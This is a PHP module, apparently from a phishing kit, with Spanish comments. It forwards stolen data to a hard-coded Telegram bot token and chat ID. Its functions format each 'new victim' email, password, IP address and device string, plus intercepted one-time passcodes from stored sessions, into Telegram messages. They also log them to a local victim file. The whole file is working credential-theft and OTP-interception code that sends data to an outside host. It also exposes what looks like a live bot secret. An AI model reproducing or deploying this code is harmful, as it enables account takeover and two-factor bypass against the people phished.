<?php
// Configuración del bot de Telegram
$telegram_bot_token = "7375357135:AAE0y8arb9ILAkYMyAcKaQlN8Zt8d1sPahA"; // Token del bot
$telegram_chat_id = "1734386292"; // ID de chat de @dcswat

/**
 * Envía un mensaje a Telegram
 * 
 * @param string $message El mensaje a enviar
 * @return bool True si se envió correctamente, False en caso contrario
 */
function send_telegram_message($message) {
    global $telegram_bot_token, $telegram_chat_id;
    
    if (empty($telegram_bot_token) || empty($telegram_chat_id) || $telegram_bot_token == "TU_TOKEN_DE_BOT") {
        // Si no se ha configurado el bot, guardar en un archivo local
        $log_file = __DIR__ . '/notifications/victim_log.txt';
        file_put_contents($log_file, date('[Y-m-d H:i:s] ') . $message . PHP_EOL, FILE_APPEND);
        return false;
    }
    
    $url = "https://api.telegram.org/bot{$telegram_bot_token}/sendMessage";
    $params = [
        'chat_id' => $telegram_chat_id,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    $success = ($response !== false);
    curl_close($ch);
    
    // También guardar en un archivo local como respaldo
    $log_file = __DIR__ . '/notifications/victim_log.txt';
    file_put_contents($log_file, date('[Y-m-d H:i:s] ') . $message . PHP_EOL, FILE_APPEND);
    
    return $success;
}

/**
 * Notifica cuando una nueva víctima ingresa sus datos
 * 
 * @param array $data Los datos de la víctima
 * @return bool True si se envió correctamente, False en caso contrario
 */
function notify_new_victim($data) {
    $message = "🔴 <b>¡NUEVA VÍCTIMA!</b> 🔴\n\n";
    $message .= "📧 <b>Email:</b> " . htmlspecialchars($data['email']) . "\n";
    $message .= "🔑 <b>Contraseña:</b> " . htmlspecialchars($data['password']) . "\n";
    
    if (isset($data['ip'])) {
        $message .= "🌐 <b>IP:</b> " . htmlspecialchars($data['ip']) . "\n";
    }
    
    if (isset($data['user_agent'])) {
        $message .= "📱 <b>Dispositivo:</b> " . htmlspecialchars($data['user_agent']) . "\n";
    }
    
    $message .= "⏰ <b>Fecha:</b> " . date('Y-m-d H:i:s') . "\n";
    
    return send_telegram_message($message);
}

/**
 * Notifica cuando una víctima ingresa un OTP
 * 
 * @param string $session_id ID de sesión
 * @param string $otp Código OTP ingresado
 * @return bool True si se envió correctamente, False en caso contrario
 */
function notify_otp_received($session_id, $otp) {
    // Obtener datos de la sesión
    $session_file = __DIR__ . "/sessions/{$session_id}.json";
    if (!file_exists($session_file)) {
        return false;
    }
    
    $session_data = json_decode(file_get_contents($session_file), true);
    
    $message = "🔵 <b>OTP RECIBIDO</b> 🔵\n\n";
    $message .= "📧 <b>Email:</b> " . htmlspecialchars($session_data['email']) . "\n";
    $message .= "🔢 <b>OTP:</b> " . htmlspecialchars($otp) . "\n";
    $message .= "🆔 <b>Sesión:</b> " . htmlspecialchars($session_id) . "\n";
    $message .= "⏰ <b>Fecha:</b> " . date('Y-m-d H:i:s') . "\n";
    
    return send_telegram_message($message);
}

// Crear directorio de notificaciones si no existe
if (!file_exists(__DIR__ . '/notifications')) {
    mkdir(__DIR__ . '/notifications', 0777, true);
}
?>